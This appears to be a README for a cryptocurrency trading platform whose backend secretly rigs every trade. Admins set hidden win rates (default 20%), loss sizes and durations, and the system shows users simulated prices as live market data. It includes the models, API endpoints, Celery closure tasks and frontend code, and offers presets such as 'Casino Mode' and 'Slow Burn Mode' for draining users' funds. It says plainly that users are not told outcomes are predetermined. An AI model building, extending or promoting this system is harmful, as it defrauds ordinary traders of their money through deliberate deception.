# Admin-Controlled Biased Trading System

## Overview

The trading platform now includes an admin-controlled system that determines trade outcomes. Admins can set win/loss rates, profit/loss percentages, and trade durations. All trades are executed with WebSocket real-time data updates.

## 🆕 NEW: Active Mode Profit Probability (v1.1)

The system now supports **configurable profit probability during active trading**! Admins can set a win rate percentage (0-100%) that determines how often users profit when actively trading.

**Key Updates:**
- ✅ **Active Mode Win Rate** - Set probability of profit (default: 20%)
- ✅ **Active Mode Profit %** - Set profit amount when users win (default: 10%)
- ✅ **Probability-Based Outcomes** - Random chance determines win/loss in active mode
- ✅ **Idle Mode Unchanged** - Still guarantees wins when no one is trading

📄 **Full Documentation**: See [ACTIVE_MODE_PROFIT_PROBABILITY.md](./ACTIVE_MODE_PROFIT_PROBABILITY.md)

## Key Features

✅ **Admin-Controlled Win/Loss Rates** - Set exact percentages for winning vs losing trades
✅ **Activity-Based Trading Modes** - Different settings for idle vs active periods
✅ **Configurable Active Mode Profits** - NEW: Set win probability during active trading
✅ **Time-Based Trade Execution** - Trades close automatically after predetermined time
✅ **Profit/Loss Magnitude Control** - Set min/max profit and loss percentages  
✅ **Real-Time WebSocket Data** - Live price updates for charts and trading
✅ **Automatic Trade Closure** - Celery tasks close trades at target time
✅ **Balance Validation** - Users can only trade what they have

## Admin Settings

### Trading Settings Model

Located in: `admin_control/models.py`

```python
class TradingSettings(models.Model):
    # Enable/Disable
    is_active = True/False
    
    # Win/Loss Rates (must total 100%)
    win_rate_percentage = 20.00  # Default: 20%
    loss_rate_percentage = 80.00  # Default: 80%
    
    # Profit Magnitude
    min_profit_percentage = 5.00   # Min profit: 5%
    max_profit_percentage = 15.00  # Max profit: 15%
    
    # Loss Magnitude  
    min_loss_percentage = 10.00    # Min loss: 10%
    max_loss_percentage = 30.00    # Max loss: 30%
    
    # Time Periods
    min_trade_duration_seconds = 30       # Min: 30 seconds
    max_trade_duration_seconds = 14400    # Max: 4 hours
    
    # Market Simulation
    price_volatility_percentage = 2.00    # ±2% volatility
    update_interval_seconds = 5           # Update every 5 seconds
```

### Access Admin Settings

**Django Admin Panel:**
1. Navigate to: `http://localhost:8000/admin/`
2. Login with superuser credentials
3. Go to: **Admin Control** → **Trading Settings**
4. Modify settings and save

**API Endpoints:**

GET/PATCH `/api/admin/settings/`
```json
{
  "is_active": true,
  "win_rate_percentage": 20.00,
  "loss_rate_percentage": 80.00,
  "min_profit_percentage": 5.00,
  "max_profit_percentage": 15.00,
  "min_loss_percentage": 10.00,
  "max_loss_percentage": 30.00,
  "min_trade_duration_seconds": 30,
  "max_trade_duration_seconds": 14400,
  "price_volatility_percentage": 2.00,
  "update_interval_seconds": 5
}
```

## How Biased Trading Works

### 1. User Places Buy Order

```
User → POST /api/trading/execute/
{
  "trade_type": "buy",
  "cryptocurrency": "BTC",
  "amount": "0.1",
  "price": "43250.50",
  "leverage": 1
}
```

### 2. System Determines Outcome

Based on admin settings:
- Random number 0-100 is generated
- If ≤ win_rate_percentage → Trade will WIN
- If > win_rate_percentage → Trade will LOSS

### 3. Outcome Parameters Set

**For Win:**
```python
outcome = 'win'
percentage = random(5%, 15%)  # Min/max profit
duration = random(30s, 4hrs)  # Min/max duration
```

**For Loss:**
```python
outcome = 'loss'
percentage = random(10%, 30%)  # Min/max loss
duration = random(30s, 4hrs)   # Min/max duration
```

### 4. Trade Executes Normally

- USDT deducted from wallet
- BTC added to wallet
- Trade record created with status='executed'
- Outcome record created (hidden from user)

### 5. Auto-Closure at Target Time

Celery task runs every minute:
```python
if current_time >= target_close_time:
    if outcome == 'win':
        exit_price = entry_price * (1 + percentage/100)
    else:
        exit_price = entry_price * (1 - percentage/100)
    
    # Execute sell automatically
    execute_sell_order(...)
```

### 6. User Sees Result

- For WIN: Price increased, user makes profit
- For LOSS: Price decreased, user loses money
- PnL automatically calculated and displayed

## Example Scenarios

### Scenario 1: 80% Loss Rate, 30s-240s Duration

**Admin Settings:**
```
Win Rate: 20%
Loss Rate: 80%
Min Profit: 5%, Max Profit: 15%
Min Loss: 10%, Max Loss: 30%
Duration: 30-240 seconds (0.5-4 minutes)
```

**10 Users Place Trades:**
- 2 users → WIN (5-15% profit in 30-240 seconds)
- 8 users → LOSS (10-30% loss in 30-240 seconds)

### Scenario 2: Maximum Loss Settings

**Admin Settings:**
```
Win Rate: 10%
Loss Rate: 90%
Min Loss: 20%, Max Loss: 50%
Duration: 30-120 seconds
```

**Result:**
- 90% of trades lose 20-50% in 30-120 seconds
- 10% of trades win 5-15%

## WebSocket Real-Time Data

### WebSocket Endpoint

Connect to: `ws://localhost:8000/ws/market/<symbol>/`

Example: `ws://localhost:8000/ws/market/BTC/`

### Message Format

**Incoming (Server → Client):**
```json
{
  "type": "market_update",
  "symbol": "BTC",
  "timestamp": "2025-10-11T07:45:30Z",
  "price": 43250.50,
  "open": 43180.20,
  "high": 43300.00,
  "low": 43150.00,
  "close": 43250.50,
  "volume": 567890.12,
  "change_24h": 2.45
}
```

**Outgoing (Client → Server):**
```json
{
  "action": "subscribe",
  "symbol": "ETH"
}
```

### Update Interval

Configurable via admin settings (default: 5 seconds)

### Price Simulation

Prices fluctuate by ±volatility_percentage (default: ±2%)

## API Endpoints

### Admin Control Endpoints

**GET/PATCH** `/api/admin/settings/`
- Get or update trading settings
- Admin only

**POST** `/api/admin/settings/win-loss/`
```json
{
  "win_rate": 20,
  "min_profit": 5,
  "max_profit": 15,
  "min_loss": 10,
  "max_loss": 30
}
```

**POST** `/api/admin/settings/toggle/`
```json
{
  "is_active": true
}
```

**GET** `/api/admin/outcomes/`
- List all user trade outcomes
- Filter by: `user_id`, `is_executed`

**GET** `/api/admin/outcomes/active/`
- Get summary of all active positions
- Shows expected wins/losses

### User Trading Endpoints

**POST** `/api/trading/execute/`
- Execute trade with biased outcome
- Returns outcome info for buy orders

**GET** `/api/trading/balance/check/?symbol=BTC`
- Check available balance

**GET** `/api/trading/history/`
- Get trading history with PnL

## Automated Trade Closure

### Celery Beat Tasks

**auto_close_due_trades**
- Runs: Every 60 seconds
- Closes trades that reached target_close_time
- Applies predetermined win/loss outcome

**cleanup_old_market_data**
- Runs: Daily at midnight
- Removes market data older than 24 hours
- Keeps database clean

### How It Works

```
1. User buys BTC at $43,250
2. System determines: LOSS, -15%, 120 seconds
3. After 120 seconds:
   - Celery task triggers
   - Calculates exit price: $43,250 * 0.85 = $36,762.50
   - Automatically sells BTC at $36,762.50
   - User loses 15%
   - PnL = -$647.25
```

## Frontend Integration

### WebSocket Connection

```typescript
// Connect to market data
const ws = new WebSocket('ws://localhost:8000/ws/market/BTC/');

ws.onmessage = (event) => {
  const data = JSON.parse(event.data);
  
  if (data.type === 'market_update') {
    // Update chart with new data
    updateChart({
      timestamp: data.timestamp,
      open: data.open,
      high: data.high,
      low: data.low,
      close: data.close,
      volume: data.volume
    });
    
    // Update price display
    updatePrice(data.close, data.change_24h);
  }
};

// Subscribe to different symbol
ws.send(JSON.stringify({
  action: 'subscribe',
  symbol: 'ETH'
}));
```

### Place Biased Trade

```typescript
const placeBiasedTrade = async (symbol: string, amount: number, price: number) => {
  const response = await fetch('http://localhost:8000/api/trading/execute/', {
    method: 'POST',
    headers: {
      'Authorization': `Bearer ${token}`,
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      trade_type: 'buy',
      cryptocurrency: symbol,
      amount: amount.toString(),
      price: price.toString(),
      leverage: 1
    })
  });
  
  const data = await response.json();
  
  // data.outcome contains predetermined result
  console.log('Expected outcome:', data.outcome.expected_outcome);
  console.log('Expected %:', data.outcome.expected_percentage);
  console.log('Will close in:', data.outcome.duration_seconds, 'seconds');
};
```

## Database Schema

### TradingSettings
- Admin configures win/loss rates globally
- One active settings record
- Updated by admin users

### UserTradeOutcome
- One record per buy trade
- Contains predetermined outcome
- Links to Trade model
- Executed automatically at target time

### MarketDataSimulation
- Stores simulated OHLCV data
- Used for chart display
- Cleaned up after 24 hours

## Security & Transparency

### What Users See:
✅ Normal trading interface
✅ Real-time price charts
✅ Live market data
✅ Profit/loss results

### What Users Don't See:
❌ Predetermined outcomes
❌ Target close times
❌ Admin win/loss settings
❌ Biased execution logic

### Admin Visibility:
✅ Full control over win/loss rates
✅ View all active positions
✅ See expected outcomes
✅ Modify settings anytime
✅ View execution history

## Configuration Examples

### High Loss Rate (Casino Mode)
```
Win Rate: 10%
Loss Rate: 90%
Min Profit: 3%, Max Profit: 10%
Min Loss: 15%, Max Loss: 50%
Duration: 30-300 seconds (0.5-5 minutes)
```
Result: Users lose money fast

### Balanced Mode
```
Win Rate: 50%
Loss Rate: 50%
Min Profit: 5%, Max Profit: 20%
Min Loss: 5%, Max Loss: 20%
Duration: 300-3600 seconds (5min-1hr)
```
Result: Fair trading experience

### Slow Burn Mode
```
Win Rate: 30%
Loss Rate: 70%
Min Profit: 8%, Max Profit: 25%
Min Loss: 5%, Max Loss: 15%
Duration: 1800-14400 seconds (30min-4hrs)
```
Result: Gradual loss over time

## Testing

### 1. Set Admin Settings

```bash
curl -X PATCH http://localhost:8000/api/admin/settings/ \
  -H "Authorization: Bearer ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "win_rate_percentage": 20,
    "loss_rate_percentage": 80,
    "min_profit_percentage": 5,
    "max_profit_percentage": 15,
    "min_loss_percentage": 10,
    "max_loss_percentage": 30,
    "min_trade_duration_seconds": 30,
    "max_trade_duration_seconds": 240
  }'
```

### 2. User Places Trade

```bash
curl -X POST http://localhost:8000/api/trading/execute/ \
  -H "Authorization: Bearer USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "trade_type": "buy",
    "cryptocurrency": "BTC",
    "amount": "0.1",
    "price": "43250.50",
    "leverage": 1
  }'
```

### 3. Check Active Outcomes

```bash
curl -X GET http://localhost:8000/api/admin/outcomes/active/ \
  -H "Authorization: Bearer ADMIN_TOKEN"
```

### 4. Wait for Auto-Close

After target_close_time, Celery task automatically:
- Calculates exit price based on outcome
- Executes sell order
- Updates user balance
- Records profit/loss

## Important Notes

⚠️ **Ethical Considerations:**
- This system controls user trading outcomes
- Users are not aware trades are predetermined
- Use responsibly and within legal requirements
- Consider disclosing house edge/odds if regulated

⚠️ **Timing:**
- Trades close automatically via Celery (runs every 60 seconds)
- Actual close time may be up to 60 seconds after target
- For exact timing, reduce Celery Beat interval

⚠️ **Balance Safety:**
- System validates user balance before trades
- Cannot trade more than available
- Locked balance feature prevents double-spending

## Monitoring

### View Active Positions
```bash
GET /api/admin/outcomes/active/
```

Returns:
```json
{
  "total_active_positions": 25,
  "expected_wins": 5,
  "expected_losses": 20,
  "positions": [...]
}
```

### View Market Data History
```bash
GET /api/admin/market-history/?symbol=BTC&limit=100
```

### View User Trade History
```bash
GET /api/trading/history/?limit=50
```

## Files Created

1. **fluxor_api/admin_control/models.py** - Trading settings and outcome models
2. **fluxor_api/trades/biased_trade_executor.py** - Biased execution logic
3. **fluxor_api/core/market_consumer.py** - WebSocket consumer
4. **fluxor_api/admin_control/views.py** - Admin API views
5. **fluxor_api/admin_control/serializers.py** - API serializers
6. **fluxor_api/admin_control/urls.py** - URL routing
7. **fluxor_api/trades/tasks.py** - Celery tasks
8. **fluxor_api/fluxor_api/celery.py** - Updated with beat schedule

## Next Steps

- [ ] Create admin dashboard UI for settings
- [ ] Add real-time position monitoring
- [ ] Implement manual trade closure override
- [ ] Add detailed analytics and reports
- [ ] Create user-facing PnL charts

